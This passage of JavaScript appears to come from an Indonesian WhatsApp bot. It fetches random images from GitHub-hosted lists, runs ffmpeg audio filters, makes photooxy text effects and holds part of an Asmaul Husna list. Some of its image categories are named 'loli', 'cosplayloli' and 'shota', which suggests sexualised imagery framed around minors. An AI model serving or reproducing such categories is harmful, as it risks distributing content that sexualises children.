case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo': case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{

const caption = `> ${command}`;
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]

				Ditss.sendMessage(m.chat,{
			 image: {url:yeha},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.pin-asuma ${command}`,
							buttonText: {
								displayText: `get ${command} lain`
							}
						},
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			db.users[m.sender].limit -= 2;
await m.reply(`-2⚡ limit terpakai✓ sisa limit ${db.users[m.sender].limit}`)
break 



case 'antistik':
case 'antistiker':
case 'antisticker':{
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !isCreator) return reply(mess.admin)
 if (args.length < 1) return reply(`contoh ${prefix + command} true/false`)
 if (text === 'true') {
db.groups[from].antisticker = true
reply(mess.done)
} else if (text === 'false') {
db.groups[from].antisticker = false
reply(mess.done)
}
 }
break



case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return m?.reply("m?.reply audio nya")
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await Ditss.downloadAndSaveMediaMessage(qmsg)
let ran = pickRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m?.reply(err)
let buff = fs.readFileSync(ran)
Ditss.sendMessage(m?.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m?.reply(`m?.reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
m?.reply('error')
}}
break



// FITUR PHOTOOXY
//wm Ditss
case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{
//if (!isRegistered) return registerbut(noregis)
//if (!isGroup) return onlyGroup()
reply(mess.wait)
// if (!isPrem) return reply(mess.prem);
if (!q) return reply(`Example : ${prefix + command} Adit ganteng`);
let link;
if (/stonetext/.test(command))
link =
 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
let dehe = await photooxy.photoOxy(link, q);
Ditss.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `©Powered By Hikaa`},
{ quoted: m }
);
}
break;



const contoh = `*Asmaul Husna*
`
// data here
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`

case 'asmaulhusna': {
const asmaulhusna = [
 {
 index: 1,
 latin: "Ar Rahman",
 arabic: "الرَّحْمَنُ",
 translation_id: "Yang Memiliki Mutlak sifat Pemurah",
 translation_en: "The All Beneficent"
 },
 {
 index: 2,
 latin: "Ar Rahiim",
 arabic: "الرَّحِيمُ",
 translation_id: "Yang Memiliki Mutlak sifat Penyayang",
 translation_en: "The Most Merciful"
 },
 {
 index: 3,
 latin: "Al Malik",
 arabic: "الْمَلِكُ",
 translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
 translation_en: "The King, The Sovereign"
 },
 {
 index: 4,
 latin: "Al Quddus",
 arabic: "الْقُدُّوسُ",
 translation_id: "Yang Memiliki Mutlak sifat Suci",
 translation_en: "The Most Holy"
 },
 {
 index: 5,
 latin: "As Salaam",
 arabic: "السَّلاَمُ",
 translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
 translation_en: "Peace and Blessing"
 },
 {
 index: 6,
 latin: "Al Mu’min",
 arabic: "الْمُؤْمِنُ",
 translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
 translation_en: "The Guarantor"
 },
 {
 index: 7,
 latin: "Al Muhaimin",
 arabic: "الْمُهَيْمِنُ",
 translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
 translation_en: "The Guardian, the Preserver"
 },
 {
 index: 8,
 latin: "Al ‘Aziiz",
 arabic: "الْعَزِيزُ",
 translation_id: "Yang Memiliki Mutlak Kegagahan",
 translation_en: "The Almighty, the Self Sufficient"
 },
 {
 index: 9,
 latin: "Al Jabbar",
 arabic: "الْجَبَّارُ",
 translation_id: "Yang Memiliki Mutlak sifat Perkasa",
 translation_en: "The Powerful, the Irresistible"
 },
 {
 index: 10,
 latin: "Al Mutakabbir",
 arabic: "الْمُتَكَبِّرُ",
 translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
 translation_en: "The Tremendous"
 },
 {
 index: 11,
 latin: "Al Khaliq",
 arabic: "الْخَالِقُ",
 translation_id: "Yang Memiliki Mutlak sifat Pencipta",
 translation_en: "The Creator"
 },
 {
 index: 12,
 latin: "Al Baari’",
 arabic: "الْبَارِئُ",
 translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
 translation_en: "The Maker"
 },
 {
 index: 13,
 latin: "Al Mushawwir",
 arabic: "الْمُصَوِّرُ",
 translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
 translation_en: "The Fashioner of Forms"
 },
 {
 index: 14,
 latin: "Al Ghaffaar",
 arabic: "الْغَفَّارُ",
 translation_id: "Yang Memiliki Mutlak sifat Pengampun",
 translation_en: "The Ever Forgiving"
 },
 {
 index: 15,
 latin: "Al Qahhaar",
 arabic: "الْقَهَّارُ",
 translation_id: "Yang Memiliki Mutlak sifat Memaksa",
 translation_en: "The All Compelling Subduer"
 },
 {
 index: 16,
 latin: "Al Wahhaab",
 arabic: "الْوَهَّابُ",
 translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
 translation_en: "The Bestower"
 },
 {
 index: 17,
 latin: "Ar Razzaaq",
 arabic: "الرَّزَّاقُ",
 translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
 translation_en: "The Ever Providing"
 },
 {
 index: 18,
 latin: "Al Fattaah",
 arabic: "الْفَتَّاحُ",
 translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
 translation_en: "The Opener, the Victory Giver"
 },
 {
 index: 19,
 latin: "Al ‘Aliim",
 arabic: "اَلْعَلِيْمُ",
 translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
 translation_en: "The All Knowing, the Omniscient"
 },
 {
 index: 20,
 latin: "Al Qaabidh",
 arabic: "الْقَابِضُ",
 translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
 translation_en: "The Restrainer, the Straightener"
 },
 {
 index: 21,
 latin: "Al Baasith",
 arabic: "الْبَاسِطُ",
 translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
 translation_en: "The Expander, the Munificent"
 },
 {
 index: 22,
 latin: "Al Khaafidh",
 arabic: "الْخَافِضُ",
 translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
 translation_en: "The Abaser"
 },
 {
 index: 23,
 latin: "Ar Raafi’",
 arabic: "الرَّافِعُ",
 translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
 translation_en: "The Exalter"
 },
 {
 index: 24,
 latin: "Al Mu’izz",
 arabic: "الْمُعِزُّ",
 translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
 translation_en: "The Giver of Honor"
 },
 {
 index: 25,
 latin: "Al Mudzil",
 arabic: "المُذِلُّ",
 translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
 translation_en: "The Giver of Dishonor"
 },
 {
 index: 26,
 latin: "Al Samii’",
 arabic: "السَّمِيعُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
 translation_en: "The All Hearing"
 },
 {
 index: 27,
 latin: "Al Bashiir",
 arabic: "الْبَصِيرُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
 translation_en: "The All Seeing"
 },
 {
 index: 28,
 latin: "Al Hakam",
 arabic: "الْحَكَمُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
 translation_en: "The Judge, the Arbitrator"
 },
 {
 index: 29,
 latin: "Al ‘Adl",
 arabic: "الْعَدْلُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
 translation_en: "The Utterly Just"
 },
 {
 index: 30,
 latin: "Al Lathiif",
 arabic: "اللَّطِيفُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
 translation_en: "The Subtly Kind"
 },
 {
 index: 31,
 latin: "Al Khabiir",
 arabic: "الْخَبِيرُ",
 translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
 translation_en: "The All Aware"
 },
 {
 index: 32,
 latin: "Al Haliim",
 arabic: "الْحَلِيمُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
 translation_en: "The Forbearing, the Indulgent"
 },
 {
 index: 33,
 latin: "Al ‘Azhiim",
 arabic: "الْعَظِيمُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
 translation_en: "The Magnificent, the Infinite"
 },
 {
 index: 34,
 latin: "Al Ghafuur",
 arabic: "الْغَفُورُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
 translation_en: "The All Forgiving"
 },
 {
 index: 35,
 latin: "As Syakuur",
 arabic: "الشَّكُورُ",
 translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
 translation_en: "The Grateful"
 },
 {
 index: 36,
 latin: "Al ‘Aliy",
 arabic: "الْعَلِيُّ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
 translation_en: "The Sublimely Exalted"
 },
 {
 index: 37,
 latin: "Al Kabiir",
 arabic: "الْكَبِيرُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
 translation_en: "The Great"
 },
 {
 index: 38,
 latin: "Al Hafizh",
 arabic: "الْحَفِيظُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
 translation_en: "The Preserver"
 },
 {
 index: 39,
 latin: "Al Muqiit",
 arabic: "المُقيِت",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
 translation_en: "The Nourisher"
 },
 {
 index: 40,
 latin: "Al Hasiib",
 arabic: "الْحسِيبُ",
 translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
 translation_en: "The Reckoner"
 },
 {
 index: 41,
 latin: "Al Jaliil",
 arabic: "الْجَلِيلُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
 translation_en: "The Majestic"
 },
 {
 index: 42,
 latin: "Al Kariim",
 arabic: "الْكَرِيمُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
 translation_en: "The Bountiful, the Generous"
 },
 {
 index: 43,
 latin: "Ar Raqiib",
 arabic: "الرَّقِيبُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
 translation_en: "The Watchful"
 },
 {
 index: 44,
 latin: "Al Mujiib",
 arabic: "الْمُجِيبُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
 translation_en: "The Responsive, the Answerer"
 },
 {
 index: 45,
 latin: "Al Waasi’",
 arabic: "الْوَاسِعُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
 translation_en: "The Vast, the All Encompassing"
 },
 {
 index: 46,
 latin: "Al Hakiim",
 arabic: "الْحَكِيمُ",
 translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
 translation_en: "The Wise"
 },
 {
 index: 47,
 latin: "Al Waduud",
 arabic: "الْوَدُودُ",
 translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
